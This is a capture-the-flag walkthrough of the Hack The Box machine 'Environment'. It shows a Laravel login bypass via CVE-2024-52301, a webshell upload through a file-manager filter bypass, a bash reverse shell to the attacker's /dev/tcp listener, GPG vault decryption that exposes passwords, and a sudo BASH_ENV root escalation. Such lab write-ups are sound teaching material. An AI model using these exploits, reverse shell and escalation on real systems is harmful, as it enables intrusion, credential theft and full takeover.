---
maquina: "Environment"
dificultad: "Medium"
os: "Linux"
plataforma: "htb"
release: "03 May 2025"
retire: "06 Sep 2025"
creadores: "coopertim13"
htb_url: "https://hackthebox.com/machines/environment"
app_url: "https://app.hackthebox.com/machines/659"
url: "https://0xdf.gitlab.io/2025/09/06/htb-environment.html"
tipo: "htb"
en_lista_oscp: false
oscp_seccion: ""
---

Environment starts with a Laravel website that happens to be running in debug mode. I’ll abuse a CVE that allows me to set the environment via the URL. I’ll find in the debug crashes that if the environment is set to “preprod”, the login page is bypassed, and use that to get access to the internal site. There I’ll abuse another CVE to bypass file filtering in the Laravel filemanager to upload a webshell. I’ll find a GPG-encrypted file and the private key to get access to the next user. Finally, I’ll abuse a sudo rule that allows keeping the BASH_ENV environment variable to get root.

## Recon

### Initial Scanning

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```console
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.67
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-05 08:53 UTC
Nmap scan report for 10.10.11.67
Host is up (0.092s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.00 seconds
oxdf@hacky$ nmap -p 22,80 -vv -sCV 10.10.11.67
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-05 08:54 UTC
...[snip]...
Scanned at 2025-05-05 08:54:06 UTC for 10s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey:
|   256 5c:02:33:95:ef:44:e2:80:cd:3a:96:02:23:f1:92:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGrihP7aP61ww7KrHUutuC/GKOyHifRmeM070LMF7b6vguneFJ3dokS/UwZxcp+H82U2LL+patf3wEpLZz1oZdQ=
|   256 1f:3d:c2:19:55:28:a1:77:59:51:48:10:c4:4b:74:ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ7xeTjQWBwI6WERkd6C7qIKOCnXxGGtesEDTnFtL2f2
80/tcp open  http    syn-ack ttl 63 nginx 1.22.1
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.22.1
|_http-title: Did not follow redirect to http://environment.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
...[snip]...
Nmap done: 1 IP address (1 host up) scanned in 10.08 seconds
```

Based on the [OpenSSH and nginx](https://0xdf.gitlab.io/cheatsheets/os#debian) versions, the host is likely running Debuanb 12 Bookworm. The webserver is redirecting to `environment.htb`. I’ll do a quick scan with `ffuf` to look for any subdomains that respond differently, but not find any. I’ll add this to my `/etc/hosts` file:

```plaintext
10.10.11.67 environment.htb
```

I’ll re-scan port 80 with `nmap`, but nothing interesting.

### Website - TCP 80

#### Site

The site is for an environmental group:

![image-20250505060825743](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505060825743.png)

There are no links on the page. There is a form at the bottom to add an email to the mailing list. On entering an email, it says it was successfully added:

![image-20250505061104723](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505061104723.png)

There is some validation. If I enter a non-email string, it return an error:

![image-20250505061159129](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505061159129.png)

The page footer says the site is version “Production v1.1”:

![image-20250505070936306](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505070936306.png)

#### Tech Stack

On visiting `/` for the first time, the HTTP response headers set two cookies:

```http
HTTP/1.1 200 OK
Server: nginx/1.22.1
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Cache-Control: no-cache, private
Date: Mon, 05 May 2025 10:10:19 GMT
Set-Cookie: XSRF-TOKEN=eyJpdiI6Ikg4THdMQ25TMzl2QlpmTkJMdllGL2c9PSIsInZhbHVlIjoiUUJrL25ZUkJMSGFnRklIVlRGajJxYnl0ZWduUzVmRmwyanA1UkFpNFdWSUx2U1pGK3UvYkw3NXNKYzZUcWptaTBmTW1OaVB4UTNINHZGbmxUU2xzKzVzTG44Qk4vdlowRkVjRDVGOU4yTHBIaEVDSzhGRlBzd3E1cGlFNGZpNW8iLCJtYWMiOiIxOTQ1NGRjMGU0MThiOTMyNWU2Y2E0MjI2Y2NiNmUwODAwYTM4YzM5ZmNlYWI0NzIxNzhjMDYzMzdlYzJlMmNkIiwidGFnIjoiIn0%3D; expires=Mon, 05 May 2025 12:10:19 GMT; Max-Age=7200; path=/; samesite=lax
Set-Cookie: laravel_session=eyJpdiI6IjZDaFFsak85aFVBYmZqcGxWVVRKUFE9PSIsInZhbHVlIjoicnpCY01MNEhteWJuN2RoM3FaMmRWeWhLNUtadnMydGNoNG1oczdpOFp6YmlkSmMraE43cGZNTXpCRHMzMUFRbGwzcStHNUZzWU5KTEpJZmFuNGpVcWYvcURDb2hlZDdCRnRQYUpQZkROMUp3WFhqNGxKdUZvYXBpY3BtSmxqSHoiLCJtYWMiOiIyYTM3MTllOTQwY2MxYjNmNjgxNGU2YTM3YTgyYjgxZGZmMWNjY2Y1MmYyY2ZiODIxNDExMDdkOWMzN2FhMTNjIiwidGFnIjoiIn0%3D; expires=Mon, 05 May 2025 12:10:19 GMT; Max-Age=7200; path=/; httponly; samesite=lax
X-Frame-Options: SAMEORIGIN
X-Content-Type-Options: nosniff
Content-Length: 4602
```

These cookies are Laravel cookies. The second one, `laravel_session` can be renamed by the application to `<something else>_session`, but Laravel always sets an `XSRF-TOKEN` and a `_session` cookie.

[Laravel](https://laravel.com/) is a PHP framework that I’ve hacked [many times before](https://0xdf.gitlab.io/tags#laravel). The 404 page is the [default Laravel 404](https://0xdf.gitlab.io/cheatsheets/404#laravel):

![image-20250505061520200](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505061520200.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site. The brute force runs pretty slow for me, so despite knowing it’s a PHP site, I’ll start without any extension and with a depth of 1:

```console
oxdf@hacky$ feroxbuster -u http://environment.htb --depth 1

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://environment.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 1
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        7l        9w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET       32l      137w     6603c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        1l       27w     1713c http://environment.htb/build/assets/styles-Bl2K3jyg.css
200      GET        1l      119w     4111c http://environment.htb/build/assets/login-CnECh1Us.css
302      GET       12l       22w      358c http://environment.htb/logout => http://environment.htb/login
200      GET       54l      174w     2391c http://environment.htb/login
405      GET     2575l     8675w   244841c http://environment.htb/mailing
200      GET       87l      392w     4602c http://environment.htb/
405      GET     2575l     8675w   244839c http://environment.htb/upload
200      GET       50l      135w     2126c http://environment.htb/up
301      GET        7l       11w      169c http://environment.htb/storage => http://environment.htb/storage/
301      GET        7l       11w      169c http://environment.htb/build => http://environment.htb/build/
301      GET        7l       11w      169c http://environment.htb/vendor => http://environment.htb/vendor/
[####################] - 7m     30011/30011   0s      found:11      errors:2
[####################] - 7m     30000/30000   75/s    http://environment.htb/
```

#### Additional Enumeration

There are several paths to check out:

`/login` presents a login form:

![image-20250505062721019](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505062721019.png)

`/mailing` is takes the POST request when a user submits their email.

`/up` shows a status page:

![image-20250505062815095](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505062815095.png)

`/storage` returns 403. There could be more in here. This is a standard Laravel directory used for things like [file storage](https://laravel.com/docs/11.x/filesystem). `/build` and `/vendor` also return 403, and are also less interesting directories for Laravel.

`/upload` returns a Laravel debug page:

![image-20250505063047018](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505063047018.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

This one doesn’t leak too much information, other than the Laravel version, Laravel 11.30.0.

## Shell as www-data

### Access Management Dashboard

#### CVE-2024-52301 Background

CVE-2024-52301 is a vulnerability in this version of Laravel:

> When the register_argc_argv php directive is set to on, and users call any URL with a special crafted query string, they are able to change the environment used by the framework when handling the request.

This is a bit vague. [This page](https://github.com/Nyamort/CVE-2024-52301) describes it in more detail. When `register_argc_argv` is enabled in the `php.ini` file, a user can injection GET parameters like `--env=dev` to change the environment used by the framework.

#### CVE-2024-52301 POC

I’ve give this a try on Environment by visiting `http://environment.htb/?--env=local`. At the page footer, the version changes:

![image-20250505085907651](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505085907651.png)

In fact, I can change it to any string I want:

![image-20250505085927579](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505085927579.png)

It’s not yet clear how this helps.

#### Login Page Errors

Given that there’s clearly some Laravel debug mode doing on. I’ll send a login POST request over to Burp Repeater and play with it a bit. Sending again sends back a redirect:

![image-20250505085224158](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505085224158.png)

Sending a blank email or password still just sends the same redirect. However, if I remove the email parameter all together, it crashes:

![image-20250505085342641](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505085342641.png)

And because it’s in debug mode, it renders to contain a bunch of information:

![image-20250505085441400](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505085441400.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

There is a hint here I initially missed:

![image-20250505091021510](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505091021510.png)

It’s using the unisharp.lfm.upload module. I’ll find this later. For now, I’ll note that it is setting `$keep_loggedin` to `True` or `False` with an `if` / `elseif`. That means if the submitted value is neither “False” nor “True”, it’ll crash on line 75.

I’ll add the `email` parameter back and set `remember` to “0xdf”:

![image-20250505085648959](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505085648959.png)

If the app’s `environment` variable is set to “preprod”, it will bypass credential verification and just log in as user with id 1!

#### Bypass Login

I’ll head back to the login page and turn Burp Proxy Intercept on. I’ll log in with any creds that meet the client-side validation. In the intercepted request, I’ll add `?--env=preprod` to the path:

![image-20250505090309223](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505090309223.png)

On forwarding that (and disabling intercept), the browser loads the management dashboard:

![image-20250505090350868](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505090350868.png)

### Shell via Laravel Filemanager

#### Dashboard Enumeration

The main dashboard page is pretty plain. There’s nothing to interact with. The “Profile” link provide an opportunity to update the current user’s profile picture:

![image-20250505091416972](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505091416972.png)

I am able to change the picture:

![image-20250505092126445](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505092126445.png)

#### Upload Poking

I’ll send the upload POST request to Burp Repeater. There are two piece of HTML form data in the body:

![image-20250505092248329](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505092248329.png)

I can try things like putting a webshell into the image, but as long as the file has a `.png` (or any non-.php) extension, it won’t execute the code. If I try to upload a `.php` file, it fails:

![image-20250505092408993](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505092408993.png)

Given the success I’ve had leaking information on crashes, I’ll try to crash this route. If I change the name from `upload` to something else, it does error, but this time not with full debug output:

![image-20250505092551415](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505092551415.png)

#### Identify Laravel File Manager

My favorite way to search open source is with [grep.app](https://grep.app/search?q=Some+error+occured+during+uploading.), which finds the package in use here:

![image-20250505092711095](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505092711095.png)

It’s UniSharp’s Laravel Filemanager. This information was also present in the first crash above (though I only noticed that in hindsight).

#### CVE-2024-21546

[CVE-2024-21546](https://nvd.nist.gov/vuln/detail/CVE-2024-21546) is a vulnerability in unishare/laravel-filemanager in versions before 2.9.1 that can lead to RCE via upload filter bypass:

> Versions of the package unisharp/laravel-filemanager before 2.9.1 are vulnerable to Remote Code Execution (RCE) through using a valid mimetype and inserting the . character after the php file extension. This allows the attacker to execute malicious code.

[This gist](https://gist.github.com/ImHades101/338a06816ef97262ba632af9c78b78ca) linked from NIST shows that all the attacker needs to do is add a “.” to the end of the filename (such as `exploit.php.`).

#### Webshell

Back in Repeater, I’ll change the filename in the POST request to `0xdf.php`., and cut out most of the picture, leaving the first ~10 bytes to represent the PNG header:

![image-20250505093647087](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505093647087.png)

Sending this works:

![image-20250505094022650](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505094022650.png)

The response shows that it saves as `0xdf.php` and not `0xdf.php.`. Visiting `/storage/files/0xdf.php?cmd=id` executes:

![image-20250505094115702](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250505094115702.png)

#### Shell

I like typing the [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) directly into Firefox, as it handles all the encoding other than that I need to replace “&” with “%26”. Visiting `cmd=bash -c 'bash -i %26 /dev/tcp/10.10.14.6/443 0>%261'` results in a shell at my listening `nc`:

```console
oxdf@hacky$ nc -lnvl 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.67 35914
bash: cannot set terminal process group (932): Inappropriate ioctl for device
bash: no job control in this shell
www-data@environment:~/app/storage/app/public/files$
```

I’ll upgrade my shell using the [standard trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```console
www-data@environment:~/app/storage/app/public/files$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@environment:~/app/storage/app/public/files$ ^Z
[1]+  Stopped                 nc -lnvl 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvl 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@environment:~/app/storage/app/public/files$
```

The `user.txt` file is readable in `/home/hish`:

```console
www-data@environment:/home/hish$ cat user.txt
f7228030************************
```

## Shell as hish

### Enumeration

#### Web

The `/var/www` directory has two folders:

```console
www-data@environment:~$ ls
app  html
```

`html` has the default nginx page. `app` is the Laravel application:

```console
www-data@environment:~/app$ ls
README.md      config             postcss.config.js   tests
app            database           public              vendor
artisan        node_modules       resources           vite.config.js
bootstrap      package-lock.json  routes
composer.json  package.json       storage
composer.lock  phpunit.xml        tailwind.config.js
```

Laravel is configured through a `.env` file:

```console
www-data@environment:~/app$ cat .env
APP_NAME=Laravel
APP_ENV=production
APP_KEY=base64:BRhzmLIuAh9UG8xXCPuv0nU799gvdh49VjFDvETwY6k=
APP_DEBUG=true
APP_TIMEZONE=UTC
APP_URL=http://environment.htb
APP_VERSION=1.1

APP_LOCALE=en
APP_FALLBACK_LOCALE=en
APP_FAKER_LOCALE=en_US

APP_MAINTENANCE_DRIVER=file
# APP_MAINTENANCE_STORE=database

PHP_CLI_SERVER_WORKERS=4

BCRYPT_ROUNDS=12

LOG_CHANNEL=stack
LOG_STACK=single
LOG_DEPRECATIONS_CHANNEL=null
LOG_LEVEL=debug

DB_CONNECTION=sqlite
# DB_HOST=127.0.0.1
# DB_PORT=3306
# DB_DATABASE=laravel
# DB_USERNAME=root
# DB_PASSWORD=

SESSION_DRIVER=database
SESSION_LIFETIME=120
SESSION_ENCRYPT=false
SESSION_PATH=/
SESSION_DOMAIN=null

BROADCAST_CONNECTION=log
FILESYSTEM_DISK=local
QUEUE_CONNECTION=database

CACHE_STORE=database
CACHE_PREFIX=

MEMCACHED_HOST=127.0.0.1

REDIS_CLIENT=phpredis
REDIS_HOST=127.0.0.1
REDIS_PASSWORD=null
REDIS_PORT=6379

MAIL_MAILER=log
MAIL_SCHEME=null
MAIL_HOST=127.0.0.1
MAIL_PORT=2525
MAIL_USERNAME=null
MAIL_PASSWORD=null
MAIL_FROM_ADDRESS="hello@example.com"
MAIL_FROM_NAME="${APP_NAME}"

AWS_ACCESS_KEY_ID=
AWS_SECRET_ACCESS_KEY=
AWS_DEFAULT_REGION=us-east-1
AWS_BUCKET=
AWS_USE_PATH_STYLE_ENDPOINT=false

VITE_APP_NAME="${APP_NAME}"
```

Nothing too interesting here. The DB is SQLite. I’ll find it in `database/database.sqlite`:

```console
www-data@environment:~/app/database$ sqlite3 database.sqlite
SQLite version 3.40.1 2022-12-28 14:03:47
Enter ".help" for usage hints.
sqlite> .tables
cache                  jobs                   sessions
cache_locks            mailing_list           users
failed_jobs            migrations
job_batches            password_reset_tokens
```

The only really interesting table is `users`:

```console
sqlite> .headers on
sqlite> select * from users;
id|name|email|email_verified_at|password|remember_token|created_at|updated_at|profile_picture
1|Hish|hish@environment.htb||$2y$12$QPbeVM.u7VbN9KCeAJ.JA.WfWQVWQg0LopB9ILcC7akZ.q641r1gi||2025-01-07 01:51:54|2025-01-12 01:01:48|hish.png
2|Jono|jono@environment.htb||$2y$12$i.h1rug6NfC73tTb8XF0Y.W0GDBjrY5FBfsyX2wOAXfDWOUk9dphm||2025-01-07 01:52:35|2025-01-07 01:52:35|jono.png
3|Bethany|bethany@environment.htb||$2y$12$6kbg21YDMaGrt.iCUkP/s.yLEGAE2S78gWt.6MAODUD3JXFMS13J.||2025-01-07 01:53:18|2025-01-07 01:53:18|bethany.png
```

There are three. The hashes are bcrypt, which are very slow to crack, and not important for moving forward.

#### Users

There’s one home directory in `/home`:

```console
www-data@environment:/home$ ls
hish
```

This matches up with the uses with shells configured:

```console
www-data@environment:~$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/bash
hish:x:1000:1000:hish,,,:/home/hish:/bin/bash
```

www-data seems to have full access to hish’s home directory:

```console
www-data@environment:/home/hish$ find . -type f -ls
   136664      4 -rw-r--r--   1 hish     hish          430 May  6 00:30 ./backup/keyvault.gpg
   136658      4 -rw-r--r--   1 root     hish           33 Jan 12 11:50 ./user.txt
   130586      4 -rw-r--r--   1 hish     hish          220 Jan  6 21:28 ./.bash_logout
   156049      4 -rw-r--r--   1 hish     hish           98 Jan 12 10:23 ./.local/share/caddy/locks/storage_clean.lock
   156047      4 -rw-r--r--   1 hish     hish           36 Jan 12 10:23 ./.local/share/caddy/instance.uuid
   155848      4 -rw-r--r--   1 hish     hish            2 Jan 12 11:45 ./.local/share/nano/search_history
   136673      4 -rw-r--r--   1 hish     hish           13 Jan  6 21:43 ./.local/share/composer/.htaccess
   130563      4 -rwxr-xr-x   1 hish     hish         1945 Jan 12 03:13 ./.gnupg/private-keys-v1.d/C2DF4CF8B7B94F1EEC662473E275A0E483A95D24.key
   130567      4 -rwxr-xr-x   1 hish     hish         1945 Jan 12 03:13 ./.gnupg/private-keys-v1.d/3B966A35D4A711F02F64B80E464133B0F0DBCB04.key
   130568      4 -rwxr-xr-x   1 hish     hish         1280 Jan 12 11:48 ./.gnupg/trustdb.gpg
   130569      4 -rwxr-xr-x   1 hish     hish         1446 Jan 12 03:13 ./.gnupg/pubring.kbx
   130570      4 -rwxr-xr-x   1 hish     hish         1436 Jan 12 03:13 ./.gnupg/openpgp-revocs.d/F45830DFB638E66CD8B752A012F42AE5117FFD8E.rev
   130571      4 -rwxr-xr-x   1 hish     hish           32 Jan 12 03:11 ./.gnupg/pubring.kbx~
   130572      4 -rwxr-xr-x   1 hish     hish          600 Jan 12 11:48 ./.gnupg/random_seed
   130587      4 -rw-r--r--   1 hish     hish          807 Jan  6 21:28 ./.profile
   130588      4 -rw-r--r--   1 hish     hish         3526 Jan 12 14:42 ./.bashrc
```

`backup/keyvault.gpg` seems interesting.

And, www-data has access to all the files in hish’s `.gnupg` directory:

```console
www-data@environment:/home/hish$ ls -l .gnupg/
total 24
drwxr-xr-x 2 hish hish 4096 May  6 03:17 openpgp-revocs.d
drwxr-xr-x 2 hish hish 4096 May  6 03:17 private-keys-v1.d
-rwxr-xr-x 1 hish hish 1446 Jan 12 03:13 pubring.kbx
-rwxr-xr-x 1 hish hish   32 Jan 12 03:11 pubring.kbx~
-rwxr-xr-x 1 hish hish  600 Jan 12 11:48 random_seed
-rwxr-xr-x 1 hish hish 1280 Jan 12 11:48 trustdb.gpg
```

### Decrypt Keyvault

To decrypt a file using `gpg`, I’ll need to pass it the `-d` flag and the file. By default, it will try to read from the current user’s `.gnupg` directory, but I can use `--home <directory>` to point it elsewhere. If I try to use hish’s directory, it still fails:

```console
www-data@environment:/$ gpg -d --home /home/hish/ /home/hish/backup/keyvault.gpg
gpg: WARNING: unsafe ownership on homedir '/home/hish'
gpg: failed to create temporary file '/home/hish/.#lk0x000055979f145170.environment.24002': Permission denied
gpg: keyblock resource '/home/hish/pubring.kbx': Permission denied
gpg: encrypted with RSA key, ID B755B0EDD6CFCFD3
gpg: decryption failed: No secret key
```

It’s trying to write temporary files in `/home/hist`, which www-data does not have permission to do. It does show the file it’s trying to decrypt, `pubring.kbx`.

I’ll create a new “home directory” to use in `/dev/shm`, and copy the GPG stuff into it:

```console
www-data@environment:/$ mkdir -p /dev/shm/fakehome
www-data@environment:/$ cp -r /home/hish/.gnupg/ /dev/shm/fakehome
```

Now I can use that to decrypt:

```console
www-data@environment:/$ gpg -d --home /dev/shm/fakehome/.gnupg/ /home/hish/backup/keyvault.gpg
gpg: WARNING: unsafe permissions on homedir '/dev/shm/fakehome/.gnupg'
gpg: encrypted with 2048-bit RSA key, ID B755B0EDD6CFCFD3, created 2025-01-11
      "hish_ <hish@environment.htb>"
PAYPAL.COM -> Ihaves0meMon$yhere123
ENVIRONMENT.HTB -> marineSPm@ster!!
FACEBOOK.COM -> summerSunnyB3ACH!!
```

### su

That password works for the hish user with `su`:

```console
www-data@environment:/$ su - hish
Password:
hish@environment:~$
```

It also works from my host with SSH:

```console
oxdf@hacky$ sshpass -p 'marineSPm@ster!!' ssh hish@environment.htb
Linux environment 6.1.0-34-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.135-1 (2025-04-25) x86_64
...[snip]...
Last login: Tue May 6 03:30:51 2025 from 10.10.14.6
hish@environment:~$
```

## Shell as root

### Enumeration

The hish user can run a script called `systeminfo` as any use using `sudo`:

```console
hish@environment:~$ sudo -l
[sudo] password for hish:
Matching Defaults entries for hish on environment:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    env_keep+="ENV BASH_ENV", use_pty

User hish may run the following commands on environment:
    (ALL) /usr/bin/systeminfo
```

Interestingly, it is set with `ENV` and `BASH_ENV` as environment variables to keep.

### BASH_ENV

#### Background

The [gnu docs](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV) define `BASH_ENV` as:

> If this variable is set when Bash is invoked to execute a shell script, its value is expanded and used as the name of a startup file to read before executing the script. See Bash Startup Files.

In the [Bash Startup Files](https://www.gnu.org/software/bash/manual/bash.html#Bash-Startup-Files) section, it says:

> Invoked non-interactively When Bash is started non-interactively, to run a shell script, for example, it looks for the variable `BASH_ENV` in the environment, expands its value if it appears there, and uses the expanded value as the name of a file to read and execute. Bash behaves as if the following command were executed: `if [ -n "$BASH_ENV" ]; then . "$BASH_ENV"; fi`  but the value of the `PATH` variable is not used to search for the filename. As noted above, if a non-interactive shell is invoked with the –login option, Bash attempts to read and execute commands from the login shell startup files.

So when a script starts, the script in the `$BASH_ENV` path is just executed.

#### Exploit

To exploit this, I’ll write a simple shell script that runs `bash`:

```console
hish@environment:~$ cat /dev/shm/shell.sh
#!/bin/bash

/bin/bash
```

Now I run `systeminfo` with `sudo` and `BASH_ENV` set:

```console
hish@environment:~$ BASH_ENV=/dev/shm/shell.sh sudo systeminfo
root@environment:/home/hish#
```

And grab the root flag:

```console
root@environment:~# cat root.txt
e6740876************************
```
